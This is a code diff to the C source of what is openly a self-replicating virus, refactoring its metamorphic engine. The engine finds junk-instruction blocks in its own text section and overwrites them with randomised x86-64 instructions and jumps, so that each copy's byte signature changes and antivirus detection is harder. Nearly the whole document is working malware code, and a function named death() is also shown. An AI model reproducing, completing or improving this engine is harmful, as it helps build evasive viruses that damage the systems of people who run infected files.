@@ -15,6 +15,7 @@ extern int64_t g_key;
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
+size_t __attribute__((section(".text#"))) g_nb_junk = 0;
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
 uint16_t __attribute__((section(".text#"))) g_ri = 0;
 
@@ -40,23 +41,20 @@ static inline uint8_t ft_nrand(void) {
 }
 
 static int find_pattern(uint8_t *self, size_t offset) {
-	return (self[offset] == PUSH_OP &&
-			self[offset + 1] == PUSH_RBX &&
+	if (self[offset] != PUSH_OP || self[offset + 1] != PUSH_RBX) {
+		return 0;
+	}
 
-			self[offset + 2] == OP_64 &&
-			self[offset + 3] == XCHG &&
-			self[offset + 4] == RAX_RAX &&
+	offset += 2;
 
-			self[offset + 5] == OP_64 &&
-			self[offset + 6] == XCHG &&
-			self[offset + 7] == RAX_RAX &&
+	for (size_t i = 0; i < NOPS_LEN; i += 3) {
+		if (self[offset] != OP_64 || self[offset + 1] != XCHG || self[offset + 2] != RAX_RAX) {
+			return 0;
+		}
+		offset += 3;
+	}
 
-			self[offset + 8] == OP_64 &&
-			self[offset + 9] == XCHG &&
-			self[offset + 10] == RAX_RAX &&
-
-			self[offset + 11] == POP_RBX &&
-			self[offset + 12] == POP_OP);
+	return (self[offset] == POP_RBX && self[offset + 1] == POP_OP);
 }
 
 static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
@@ -69,32 +67,8 @@ static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 			i += JUNK_LEN;
 		}
 	}
+	g_nb_junk = j;
 }
-
-enum e_opcode {
-
-	OPCODE_XCHG  = 0x87,
-	OPCODE_MOV   = 0x8B,
-	//OPCODE_MOVSX = 0x63,
-
-	OPCODE_ADD_RM_R = 0x01,
-	OPCODE_ADD_R_RM = 0x03,
-
-	OPCODE_SUB_RM_R = 0x29,
-	OPCODE_SUB_R_RM = 0x2B,
-
-	OPCODE_ADC  = 0x11,
-	OPCODE_SBB  = 0x19,
-	OPCODE_ADD  = 0x83,
-
-	OPCODE_AND  = 0x21,
-	OPCODE_OR   = 0x09,
-	OPCODE_XOR  = 0x31,
-	OPCODE_TEST = 0x85,
-	OPCODE_CMP  = 0x39,
-
-	OPCODE_SHL  = 0xD3,
-};
 
 static uint8_t get_random_opcode(uint8_t rand) {
 	const uint8_t opcodes[] = {
@@ -117,31 +91,46 @@ static uint8_t get_random_opcode(uint8_t rand) {
 	};
 
 	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
-
 }
 
-static void patch_jmp(uint8_t *nop, int *instr_off, int instr_len, int jmp_offset) {
+/* patch_jmp: patch the jmp instruction with a random offset
+ * example: we have an array of instructions_offsets = {0, 2, 4, 6, 8}
+ * lets say the jmp instruction is at index 1 so instr_off[jmp_index] = 2
+ * we patch randomly the jump to go to one of the next instructions
+ * in this example jmp can jmp {0, 2, 4} (jmp 0 means it will jmp to the next instruction)
+ */
+
+static void patch_jmp(uint8_t *nop, uint8_t *instr_off, uint8_t instr_len, int8_t jmp_index) {
 
 	int dest_i = ft_nrand() % (instr_len + 1);
 
 	if (dest_i < instr_len) {
-		*nop = (uint8_t)(instr_off[dest_i] - jmp_offset - 2);
+		*nop = (uint8_t)(instr_off[dest_i] - jmp_index - 2);
 	} else {
 		return;
 	}
 }
 
+/* fill_nop: fill the nop array with random instructions 
+ * nop: the array to fill
+ * reg_1 and reg_2: the registers to use
+ * file_off: the offset in the file relative to the start of the virus
+ * instr_off: the array of offsets of the instructions
+ * bytes_len: the number of bytes to fill
+ */
+
 static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
-	int nop_size = NOPS_LEN;
-	int bytes_len = 0;
-	int offset = 0;
+	uint8_t nop_size = NOPS_LEN;
+	uint8_t bytes_len = 0;
 
-	int instr_off[MAX_INSTR];
+	uint8_t offset = 0;
+	uint8_t instr_off[MAX_INSTR];
+	uint8_t instr_count = 0;
 
-	int instr_count = 0;
+	int8_t jmp_index = -1;
 
-	int jmp_index = -1;
+	bool lea_flag = false;
 
 	while (nop_size > 0) {
 		bytes_len = (ft_nrand() % 4) + 2;
@@ -156,9 +145,11 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 		}
 
 		switch (bytes_len) {
+
 			case 1:
 				nop[offset] = 0x90;
 				break;
+
 			case 2:
 				if (jmp_index == -1 && ft_nrand() % 2 == 0) {
 					nop[offset] = 0xEB;
@@ -169,17 +160,30 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 					nop[offset + 1] = 0xC0 + reg_2 + (reg_1 << 3);
 				}
 				break;
+
 			case 3:
 				nop[offset] = 0x48;
 				nop[offset + 1] = get_random_opcode(ft_nrand());
 				nop[offset + 2] = 0xC0 + reg_1 + (reg_2 << 3);
 				break;
+
 			case 4:
-				nop[offset] = 0x48;
-				nop[offset + 1] = 0x8D; // 0x83 also works
-				nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
-				nop[offset + 3] = ft_nrand();
+				if (!lea_flag) {
+					nop[offset] = 0x48;
+					nop[offset + 1] = 0x8D;
+					nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
+					nop[offset + 3] = ft_nrand();
+					lea_flag = true;
+					break;
+				} else {
+					nop[offset] = 0x48;
+					nop[offset + 1] = 0x83;
+					nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
+					nop[offset + 3] = ft_nrand();
+					break;
+				}
 				break;
+
 			case 5: 
 				{
 					nop[offset] = 0xE8;
@@ -208,7 +212,8 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 		uint8_t *jmp_val = nop + instr_off[jmp_index] + 1;
 
 		if (jmp_index + 1 < instr_count) {
-			patch_jmp(jmp_val, instr_off + jmp_index + 1, instr_count - jmp_index - 1, instr_off[jmp_index]);
+			//patch_jmp(jmp_val, instr_off + jmp_index + 1, instr_count - jmp_index - 1, instr_off[jmp_index]);
+			patch_jmp(jmp_val, &instr_off[jmp_index + 1], instr_count - jmp_index - 1, instr_off[jmp_index]);
 		}
 	}
 }
@@ -229,35 +234,25 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 
 	JUNK;
 
-	uint8_t push_1 = PUSH_OP + reg_1;
-	uint8_t push_2 = PUSH_OP + reg_2;
+	rdm_junk[0] = PUSH_OP + reg_1;
+	rdm_junk[1] = PUSH_OP + reg_2;
 
-	uint8_t pop_1 = POP_OP + reg_1;
-	uint8_t pop_2 = POP_OP + reg_2;
+	fill_nop(rdm_junk + 2, reg_1, reg_2, file_off);
 
-	uint8_t nop[NOPS_LEN];
-	fill_nop(nop, reg_1, reg_2, file_off);
-
-	rdm_junk[0] = push_1;
-	rdm_junk[1] = push_2;
-
-	ft_memcpy(rdm_junk + 2, nop, NOPS_LEN);
-
-	rdm_junk[JUNK_LEN - 2] = pop_2;
-	rdm_junk[JUNK_LEN - 1] = pop_1;
+	rdm_junk[JUNK_LEN - 2] = POP_OP + reg_2;
+	rdm_junk[JUNK_LEN - 1] = POP_OP + reg_1;
 
 	JUNK;
 }
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
 
-	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
-		/* at this point junk_offsets is filled */
-		if (junk_offsets[i] == 0) {
-			break;
-		}
+	for (size_t i = 0; i < g_nb_junk; i++) {
+
 		uint8_t rdm_junk[JUNK_LEN];
+
 		gen_junk(rdm_junk, junk_offsets[i]);
+
 		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
 
 	}
@@ -296,13 +291,11 @@ void prepare_mutate(void) {
 
 void mutate(void) {
 
-
 	uintptr_t start = (uintptr_t)&_start;
 
 	replace_nop((uint8_t *)start, g_junk_offsets);
 
 	JUNK;
-
 }
 
 int death(int start_offset, file_t *file) {
